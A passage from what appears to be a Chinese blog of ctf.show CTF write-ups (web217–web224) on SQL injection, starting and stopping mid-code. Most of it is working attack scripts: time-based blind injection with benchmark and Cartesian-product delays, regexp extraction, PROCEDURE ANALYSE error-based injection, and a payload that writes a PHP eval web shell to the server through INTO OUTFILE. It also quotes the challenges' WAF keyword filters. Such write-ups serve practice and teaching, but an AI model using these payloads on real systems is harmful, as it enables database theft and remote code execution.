class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">min</span>,<span class="hljs-built_in">max</span> = <span class="hljs-number">32</span>, <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        j = <span class="hljs-built_in">min</span> + (<span class="hljs-built_in">max</span>-<span class="hljs-built_in">min</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == j):<br>            <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 爆表名</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},benchmark(3000000,sha(1)),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆列</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'),{i},1))&lt;{j},benchmark(3000000,sha(1)),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆值</span><br>        payload = {<br>            <span class="hljs-string">'ip'</span>: <span class="hljs-string">f"'') or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),<span class="hljs-subst">{i}</span>,1))&lt;<span class="hljs-subst">{j}</span>,benchmark(3000000,sha(1)),'False')#"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-number">0</span><br>        }<br>        start_time = time.time()<br>        r = requests.post(url=url, data=payload).text<br>        end_time = time.time()<br>        sub = end_time - start_time<br>        <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>            <span class="hljs-built_in">max</span> = j<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = j<br></code></pre></td></tr></tbody></table></figure><h3 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h3><p>这里的时间要根据自己网络时间设置</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br>url = "http://06e23409-ffcb-4e9d-85df-c3b49ef25743.challenge.ctf.show/api/"<br><br>flagStr = " 1234567890{}-qazwsxedcrfvtgbyhnujmikolp"<br># payload = "<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'ctfshow_flagxc'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> flagaac <span class="hljs-keyword">from</span> ctfshow_flagxc<span class="hljs-string">"</span><br><span class="hljs-string">j = 1</span><br><span class="hljs-string">res = "</span><span class="hljs-string">"</span><br><span class="hljs-string">while 1:</span><br><span class="hljs-string">    for i in flagStr:</span><br><span class="hljs-string">        data = {</span><br><span class="hljs-string">            'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> group_concat(flagaac) <span class="hljs-keyword">from</span> ctfshow_flagxc),{j},<span class="hljs-number">1</span>))={ord(i)},(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">            'debug': '0'</span><br><span class="hljs-string">        }</span><br><span class="hljs-string">        # print(data)</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            r = requests.post(url, data, timeout=0.2)</span><br><span class="hljs-string">        except requests.Timeout as e:</span><br><span class="hljs-string">            res += i</span><br><span class="hljs-string">            print(res)</span><br><span class="hljs-string">            j += 1</span><br><span class="hljs-string"></span><br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">'http://e2f3b94c-56fa-4321-8373-9328a775458a.challenge.ctf.show/api/'</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">min</span>,<span class="hljs-built_in">max</span> = <span class="hljs-number">32</span>, <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        j = <span class="hljs-built_in">min</span> + (<span class="hljs-built_in">max</span>-<span class="hljs-built_in">min</span>)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == j):<br>            <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 爆表名</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆列</span><br>        <span class="hljs-comment"># payload = {</span><br>        <span class="hljs-comment">#     'ip': f"'') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'),{i},1))&lt;{j},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),'False')#",</span><br>        <span class="hljs-comment">#     'debug': 0</span><br>        <span class="hljs-comment"># }</span><br>        <span class="hljs-comment"># 爆值</span><br>        payload = {<br>            <span class="hljs-string">'ip'</span>: <span class="hljs-string">f"'') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),<span class="hljs-subst">{i}</span>,1))&lt;<span class="hljs-subst">{j}</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),'False')#"</span>,<br>            <span class="hljs-string">'debug'</span>: <span class="hljs-number">0</span><br>        }<br>        start_time = time.time()<br>        r = requests.post(url=url, data=payload).text<br>        end_time = time.time()<br>        sub = end_time - start_time<br>        <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.3</span>:<br>            <span class="hljs-built_in">max</span> = j<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = j<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB219"><a href="#WEB219" class="headerlink" title="WEB219"></a>WEB219</h3><p>这题增加了过滤rlike,rlike同样可以用来进行延时注入，因此上一题的笛卡尔积注入依旧可用。</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br>url = "http://06e23409-ffcb-4e9d-85df-c3b49ef25743.challenge.ctf.show/api/"<br><br>flagStr = " 1234567890{}-qazwsxedcrfvtgbyhnujmikolp"<br># payload = "<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'ctfshow_flagxc'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><span class="hljs-string">"</span><br><span class="hljs-string"># payload = "</span><span class="hljs-keyword">select</span> flagaac <span class="hljs-keyword">from</span> ctfshow_flagxc<span class="hljs-string">"</span><br><span class="hljs-string">j = 1</span><br><span class="hljs-string">res = "</span><span class="hljs-string">"</span><br><span class="hljs-string">while 1:</span><br><span class="hljs-string">    for i in flagStr:</span><br><span class="hljs-string">        data = {</span><br><span class="hljs-string">            'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>((<span class="hljs-keyword">select</span> group_concat(flagaac) <span class="hljs-keyword">from</span> ctfshow_flagxc),{j},<span class="hljs-number">1</span>))={ord(i)},(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">            'debug': '0'</span><br><span class="hljs-string">        }</span><br><span class="hljs-string">        # print(data)</span><br><span class="hljs-string">        try:</span><br><span class="hljs-string">            r = requests.post(url, data, timeout=0.2)</span><br><span class="hljs-string">        except requests.Timeout as e:</span><br><span class="hljs-string">            res += i</span><br><span class="hljs-string">            print(res)</span><br><span class="hljs-string">            j += 1</span><br><span class="hljs-string"></span><br><span class="hljs-string"># ctfshow{28c16a64-a76b-44d0-bd45-a1ea931736c9}</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB220"><a href="#WEB220" class="headerlink" title="WEB220"></a>WEB220</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> waf($str){<br>        return preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">sleep</span>|<span class="hljs-params">benchmark</span>|<span class="hljs-params">rlike</span>|<span class="hljs-params">ascii</span>|<span class="hljs-params">hex</span>|<span class="hljs-params">concat_ws</span>|<span class="hljs-params">concat</span>|<span class="hljs-params">mid</span>|<span class="hljs-params">substr</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>',$<span class="hljs-params">str</span>)</span>;<br>    }<br></code></pre></td></tr></tbody></table></figure><p>PY:</p><figure class="highlight n1ql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">import requests<br>import time<br>url = 'http://433c1ab3-4871-4ed1-be2e-80c03bcb160a.challenge.ctf.show//api/'<br>flag = 'ctfshow'  # 按情况修改<br>string = '{abcdefghijklmn-_0123456789}'<br>for i in range(8, 60):<br>    for j in string:<br>        # 爆表名<br>        # payload = {<br>        #     'ip': f"'') or if(left((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),{i})regexp(<span class="hljs-string">'{str+j}'</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">        #     'debug': 0</span><br><span class="hljs-string">        # }</span><br><span class="hljs-string">        # 爆列</span><br><span class="hljs-string">        # payload = {</span><br><span class="hljs-string">        #     'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'ctfshow_flagxcac'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),{i})regexp(<span class="hljs-string">'{str+j}'</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">        #     'debug': 0</span><br><span class="hljs-string">        # }</span><br><span class="hljs-string">        # 爆值</span><br><span class="hljs-string">        payload = {</span><br><span class="hljs-string">            'ip': f"</span><span class="hljs-string">''</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> flagaabcc <span class="hljs-keyword">from</span> ctfshow_flagxcac),{i})regexp(<span class="hljs-string">'{flag+j}'</span>),(<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> information_schema.columns A, information_schema.columns B),<span class="hljs-string">'False'</span>)#<span class="hljs-string">",</span><br><span class="hljs-string">            'debug': 0</span><br><span class="hljs-string">        }</span><br><span class="hljs-string">        start_time = time.time()</span><br><span class="hljs-string">        r = requests.post(url=url, data=payload).text</span><br><span class="hljs-string">        end_time = time.time()</span><br><span class="hljs-string">        print(payload)</span><br><span class="hljs-string">        sub = end_time - start_time</span><br><span class="hljs-string">        if sub &gt;= 0.3:</span><br><span class="hljs-string">            flag += j</span><br><span class="hljs-string">            print(flag)</span><br><span class="hljs-string">            break</span><br><span class="hljs-string"></span><br></code></pre></td></tr></tbody></table></figure><h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><p>LIMLT注入</p><h3 id="WEB221"><a href="#WEB221" class="headerlink" title="WEB221"></a>WEB221</h3><p>SQL查询语句：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sql</span> = <span class="hljs-keyword">select</span> * from ctfshow_user <span class="hljs-built_in">limit</span> (<span class="hljs-variable">$page</span>-1)*<span class="hljs-variable">$limit</span>,<span class="hljs-variable">$limit</span>;<br></code></pre></td></tr></tbody></table></figure><h4 id="PROCEDURE-ANALYZE"><a href="#PROCEDURE-ANALYZE" class="headerlink" title="PROCEDURE ANALYZE"></a>PROCEDURE ANALYZE</h4><p><code>PROCEDURE ANALYSE()</code>自 MySQL 5.7.18 起已弃用，并已在 MySQL 8.0 中删除。</p><p><code>ANALYSE()</code>检查查询的结果，并返回对结果的分析，该分析建议每列的最佳数据类型，这可能有助于减小 table 的大小。要获得此分析，请将<code>PROCEDURE ANALYSE</code>附加到<a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/select.html">SELECT</a>语句的末尾：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SELECT ... FROM ... WHERE ... PROCEDURE ANALYSE([max_elements,[max_memory]])<br></code></pre></td></tr></tbody></table></figure><p>For example:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SELECT col1, col2 FROM table1 PROCEDURE ANALYSE(10, 2000);<br></code></pre></td></tr></tbody></table></figure><p>结果显示查询返回的值的一些统计信息，并为列提出最佳数据类型。这对于检查现有 table 或导入新数据后会很有帮助。您可能需要为参数尝试不同的设置，以使<code>PROCEDURE ANALYSE()</code>在不合适的时候不建议<a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/enum.html">ENUM</a>数据类型。</p><p>参数是可选的，并按如下方式使用：</p><p><code>max_elements</code> <em>(默认值为 256)是<code>ANALYSE()</code>每列注意到的最大不同值数。 <code>ANALYSE()</code>使用它来检查最佳数据类型是否应为<a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/enum.html">ENUM</a>类型；如果有</em> * <code>max_elements</code>个以上的不同值，则<a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/enum.html">ENUM</a>不是建议的类型。</p><p><code>max_memory</code> *(默认 8192)是<code>ANALYSE()</code>在尝试查找所有不同值时应为每列分配的最大内存量。</p><p><a href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/union.html">UNION</a>语句中不允许使用<code>PROCEDURE</code>子句。</p><p><strong>基于此，构建报错注入</strong>：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">http://url/api/?page=<span class="hljs-number">1</span>&amp;limit=<span class="hljs-number">10</span> procedure <span class="hljs-built_in">analyse</span>(<span class="hljs-built_in">extractvalue</span>(<span class="hljs-built_in">rand</span>(),<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x3a,<span class="hljs-built_in">database</span>())),<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB222"><a href="#WEB222" class="headerlink" title="WEB222"></a>WEB222</h3><p>GROUP注入</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs powershell">import requests<br><br>url = <span class="hljs-string">"http://66e4578e-74dd-4722-a9dd-a6bf8cb6be50.challenge.ctf.show/api/"</span><br><br><span class="hljs-comment">#payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><br><span class="hljs-comment">#payload = "select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1"</span><br>payload = <span class="hljs-string">"select flagaabc from ctfshow_flaga"</span><br>res = <span class="hljs-string">""</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> True:<br>    i = i+<span class="hljs-number">1</span><br>    <span class="hljs-built_in">start</span> = <span class="hljs-number">32</span><br>    <span class="hljs-keyword">end</span> = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">start</span> &lt; <span class="hljs-keyword">end</span>:<br>        mid = (<span class="hljs-built_in">start</span>+<span class="hljs-keyword">end</span>) &gt;&gt; <span class="hljs-number">1</span><br>        params = {<br>            <span class="hljs-string">'u'</span>: f<span class="hljs-string">"1,if(ascii(substr(({payload}),{i},1))&gt;{mid},sleep(0.1),1)"</span><br>        }<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">r</span> = requests.get(url, params=params, timeout=<span class="hljs-number">0.5</span>)<br>            <span class="hljs-keyword">end</span> = mid<br>        except requests.Timeout as e:<br>            <span class="hljs-built_in">start</span> = mid+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">start</span> != <span class="hljs-number">32</span>:<br>        res = res+chr(<span class="hljs-built_in">start</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(res)<br><br></code></pre></td></tr></tbody></table></figure><h3 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h3><p>比起web222题，增加了用户名不能是数字的限制</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">'http://90b8ab81-6a05-4ebc-ab88-62e8442c0e89.challenge.ctf.show/api/?u='</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">''</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">num2true</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">'('</span> + <span class="hljs-string">'true%2b'</span> * (num-<span class="hljs-number">1</span>) + <span class="hljs-string">'true)'</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br>a = num2true(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># print(a)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">60</span>):<br>    <span class="hljs-built_in">min</span>,<span class="hljs-built_in">max</span> = <span class="hljs-number">32</span>, <span class="hljs-number">128</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        j = <span class="hljs-built_in">min</span> + (<span class="hljs-built_in">max</span>-<span class="hljs-built_in">min</span>)&gt;&gt;<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">min</span> == j):<br>            <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># 爆表名</span><br>        <span class="hljs-comment"># payload = f"if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{num2true(i)},true))&lt;{num2true(j)},username,true)"</span><br>        <span class="hljs-comment"># 爆列</span><br>        <span class="hljs-comment"># payload = f"if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'),{num2true(i)},true))&lt;{num2true(j)},username,true)"</span><br>        <span class="hljs-comment"># 爆值</span><br>        payload = <span class="hljs-string">f"if(ascii(substr((select group_concat(flagasabc) from ctfshow_flagas),<span class="hljs-subst">{num2true(i)}</span>,true))&lt;<span class="hljs-subst">{num2true(j)}</span>,username,true)"</span><br>        r = requests.get(url=url+payload).text<br>        <span class="hljs-comment"># print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">'passwordAUTO'</span> <span class="hljs-keyword">in</span> r:<br>            <span class="hljs-built_in">max</span> = j<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">min</span> = j<br></code></pre></td></tr></tbody></table></figure><h3 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h3><p>在给我们的登录界面，测试发现单引号，双引号都被过滤，也就是没有办法闭合，说明注入点不在此处。</p><p>在robots.txt可以找到线索，pwdreset.php</p><p>随便设置密码就能进行重置admin密码，进去是文件上传的界面：</p><p>对文件内容和文件类型进行了限制：</p><p>但是上传文件可以发现其将数据写到数据库了</p><p>PY:</p><figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">C64File "');select 0x3c3f706870206576616c28245f4745545b315d293b3f3e into outfile '/var/www/html/a.php';--+</span><br><span class="language-xml">#保存为txt文件上传</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></tbody></table></figure><p>checklogin.php</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">'/inc/inc.php'</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'login'</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pwd'</span>])){<br><span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'login'</span>];<br><span class="hljs-variable">$user_password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'pwd'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\{|\[|\}|\]|\;|\:|\'|\"|\&lt;|\,|\&gt;|\.|\?/i"</span>,<span class="hljs-variable">$user_name</span>)){<br><span class="hljs-keyword">die</span>(<span class="hljs-string">"stop hack!"</span>);<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\{|\[|\}|\]|\;|\:|\'|\"|\&lt;|\,|\&gt;|\.|\?/i"</span>,<span class="hljs-variable">$user_password</span>)){<br><span class="hljs-keyword">die</span>(<span class="hljs-string">"stop hack!"</span>);<br>}<br><span class="hljs-variable">$data</span>=<span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-string">"admin"</span>,[<span class="hljs-string">"username"</span>,<span class="hljs-string">"password"</span>],[<span class="hljs-string">"username[=]"</span>=&gt;<span class="hljs-string">"<span class="hljs-subst">$user_name</span>"</span>]);<br><span class="hljs-variable">$result</span>=<span class="hljs-string">""</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$d</span>){<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$d</span>[<span 